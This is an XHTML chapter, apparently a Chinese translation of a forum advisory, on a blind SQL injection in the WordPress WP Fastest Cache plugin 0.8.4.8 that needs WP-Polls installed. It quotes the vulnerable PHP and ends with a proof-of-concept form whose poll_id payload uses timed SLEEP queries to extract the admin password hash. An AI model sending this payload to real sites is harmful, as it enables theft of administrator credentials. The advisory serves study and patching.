@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>WordPress WP Fastest Cache 插件0.8.4.8盲注</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>WordPress WP Fastest Cache 插件0.8.4.8盲注</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=400630696&amp;idx=1&amp;sn=bdc832c6a177d75da42a82dc6068654d&amp;chksm=0db3db4f3ac45259e093733e55237cb4ae6b040fac37a1852bf6bad2824eac49e2d1f842114f&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=400630696&amp;idx=1&amp;sn=bdc832c6a177d75da42a82dc6068654d&amp;chksm=0db3db4f3ac45259e093733e55237cb4ae6b040fac37a1852bf6bad2824eac49e2d1f842114f&amp;scene=27#wechat_redirect</a></blockquote><p>插件主页：https://wordpress.org/plugins/wp-fastest-cache/</p><p>此漏洞需要安装WP-Polls模块。</p><p>文件: wp-fastest-cache\inc\wp-polls.php</p><pre><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">hook</span><span class="p">(){</span>
+	<span class="nx">add_action</span><span class="p">(</span> <span class="s1">'wp_ajax_nopriv_wpfc_wppolls_ajax_request'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s2">"wpfc_wppolls_ajax_request"</span><span class="p">));</span>
+	<span class="nx">add_action</span><span class="p">(</span> <span class="s1">'wp_ajax_wpfc_wppolls_ajax_request'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s2">"wpfc_wppolls_ajax_request"</span><span class="p">));</span><span class="p">}</span></code></pre><p><code>$_POST["poll_id"]</code>没有过滤，因为<code>mysql_real_escape_string()</code>只过滤\x00, \n, \r, \, ‘, “ and \x1a.</p><p>文件: wp-fastest-cache\inc\wp-polls.php</p><pre><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">wpfc_wppolls_ajax_request</span><span class="p">()</span> <span class="p">{</span>
+	<span class="nv">$id</span> <span class="o">=</span> <span class="nb">strip_tags</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"poll_id"</span><span class="p">]);</span>
+	<span class="nv">$id</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+
+	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">check_voted</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">){</span>
+		<span class="k">echo</span> <span class="s2">"true"</span><span class="p">;</span>
+	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+		<span class="k">echo</span> <span class="s2">"false"</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">die</span><span class="p">();</span><span class="p">}</span></code></pre><p>所以我们可以在<code>check_voted_ip()</code> <code>或check_voted_username</code>()这两处进行注入。</p><p>文件: wp-polls\wp-polls.php</p><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">check_voted</span><span class="p">(</span><span class="nv">$poll_id</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$poll_logging_method</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nx">get_option</span><span class="p">(</span><span class="s1">'poll_logging_method'</span><span class="p">));</span>
+	<span class="k">switch</span><span class="p">(</span><span class="nv">$poll_logging_method</span><span class="p">)</span> <span class="p">{</span>
+		<span class="c1">// Do Not Log</span>
+		<span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="c1">// Logged By Cookie</span>
+		<span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+			<span class="k">return</span> <span class="nx">check_voted_cookie</span><span class="p">(</span><span class="nv">$poll_id</span><span class="p">);</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="c1">// Logged By IP</span>
+		<span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+			<span class="k">return</span> <span class="nx">check_voted_ip</span><span class="p">(</span><span class="nv">$poll_id</span><span class="p">);</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="c1">// Logged By Cookie And IP</span>
+		<span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+			<span class="nv">$check_voted_cookie</span> <span class="o">=</span> <span class="nx">check_voted_cookie</span><span class="p">(</span><span class="nv">$poll_id</span><span class="p">);</span>
+			<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$check_voted_cookie</span><span class="p">))</span> <span class="p">{</span>
+				<span class="k">return</span> <span class="nv">$check_voted_cookie</span><span class="p">;</span>
+			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+				<span class="k">return</span> <span class="nx">check_voted_ip</span><span class="p">(</span><span class="nv">$poll_id</span><span class="p">);</span>
+			<span class="p">}</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="c1">// Logged By Username</span>
+		<span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+			<span class="k">return</span> <span class="nx">check_voted_username</span><span class="p">(</span><span class="nv">$poll_id</span><span class="p">);</span>
+			<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span><span class="p">}</span><span class="k">function</span> <span class="nf">check_voted_ip</span><span class="p">(</span><span class="nv">$poll_id</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">global</span> <span class="nv">$wpdb</span><span class="p">;</span>
+	<span class="nv">$log_expiry</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nx">get_option</span><span class="p">(</span><span class="s1">'poll_cookielog_expiry'</span><span class="p">));</span>
+	<span class="nv">$log_expiry_sql</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$log_expiry</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$log_expiry_sql</span> <span class="o">=</span> <span class="s1">'AND ('</span><span class="o">.</span><span class="nx">current_time</span><span class="p">(</span><span class="s1">'timestamp'</span><span class="p">)</span><span class="o">.</span><span class="s1">'-(pollip_timestamp+0)) &lt; '</span><span class="o">.</span><span class="nv">$log_expiry</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="c1">// Check IP From IP Logging Database</span>
+	<span class="nv">$get_voted_aids</span> <span class="o">=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">get_col</span><span class="p">(</span><span class="s2">"SELECT pollip_aid FROM </span><span class="si">$wpdb-&gt;pollsip</span><span class="s2"> WHERE pollip_qid = </span><span class="si">$poll_id</span><span class="s2"> AND pollip_ip = '"</span><span class="o">.</span><span class="nx">get_ipaddress</span><span class="p">()</span><span class="o">.</span><span class="s2">"' </span><span class="si">$log_expiry_sql</span><span class="s2">"</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$get_voted_aids</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nv">$get_voted_aids</span><span class="p">;</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span><span class="p">}</span><span class="k">function</span> <span class="nf">check_voted_username</span><span class="p">(</span><span class="nv">$poll_id</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">global</span> <span class="nv">$wpdb</span><span class="p">,</span> <span class="nv">$user_ID</span><span class="p">;</span>
+	<span class="c1">// Check IP If User Is Guest</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_user_logged_in</span><span class="p">())</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="nv">$pollsip_userid</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$user_ID</span><span class="p">);</span>
+	<span class="nv">$log_expiry</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nx">get_option</span><span class="p">(</span><span class="s1">'poll_cookielog_expiry'</span><span class="p">));</span>
+	<span class="nv">$log_expiry_sql</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$log_expiry</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$log_expiry_sql</span> <span class="o">=</span> <span class="s1">'AND ('</span><span class="o">.</span><span class="nx">current_time</span><span class="p">(</span><span class="s1">'timestamp'</span><span class="p">)</span><span class="o">.</span><span class="s1">'-(pollip_timestamp+0)) &lt; '</span><span class="o">.</span><span class="nv">$log_expiry</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="c1">// Check User ID From IP Logging Database</span>
+	<span class="nv">$get_voted_aids</span> <span class="o">=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">get_col</span><span class="p">(</span><span class="s2">"SELECT pollip_aid FROM </span><span class="si">$wpdb-&gt;pollsip</span><span class="s2"> WHERE pollip_qid = </span><span class="si">$poll_id</span><span class="s2"> AND pollip_userid = </span><span class="si">$pollsip_userid</span><span class="s2"> </span><span class="si">$log_expiry_sql</span><span class="s2">"</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$get_voted_aids</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nv">$get_voted_aids</span><span class="p">;</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span><span class="p">}</span></code></pre><p>poc</p><pre><code class="language-html" data-lang="html"><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"http://wordpress-url/wp-admin/admin-ajax.php?action=wpfc_wppolls_ajax_request"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"poll_id"</span> <span class="na">value=</span><span class="s">"0 UNION (SELECT IF(substr(user_pass,1,1) = CHAR(36), SLEEP(5), 0) FROM `wp_users` WHERE ID = 1) -- "</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Send"</span><span class="nt">&gt;</span><span class="nt">&lt;/form&gt;</span></code></pre><p>from；https://rstforums.com/forum/107273-wordpress-wp-fastest-cache-plugin-0-8-4-8-blind-sql-injection.rst</p><p>翻译：小歪（关注安全技术公众号&amp;heresec）<br/></p>
+        
+</body>
+</html>
